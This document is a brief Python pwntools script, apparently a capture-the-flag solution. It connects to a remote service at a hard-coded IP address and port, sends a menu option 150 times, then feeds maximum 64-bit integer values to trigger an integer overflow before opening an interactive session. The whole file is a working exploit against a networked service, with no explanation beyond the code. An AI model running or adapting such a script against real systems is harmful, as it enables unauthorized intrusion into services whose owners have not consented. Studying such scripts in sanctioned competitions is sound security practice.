from pwn import *

#r=process(['python','a.py'])
r=remote("52.163.228.53",8082)
i=0
for i in range(150):
	print i
	i+=1
	r.sendlineafter(':','1')
	r.sendline('0')
context.log_level='debug'
r.sendline(str(1))
r.sendline(str(2**63-1))
r.sendline(str(1))
r.sendline(str(2**64-1))
r.sendline(str(1))
r.sendline(str(2**63-1))
r.sendline(str(1))
r.sendline(str(2**63-1))
r.sendline(str(1))
r.sendline(str(2**64-1))
r.sendline(str(1))
r.sendline(str(2**63-1))
r.interactive()
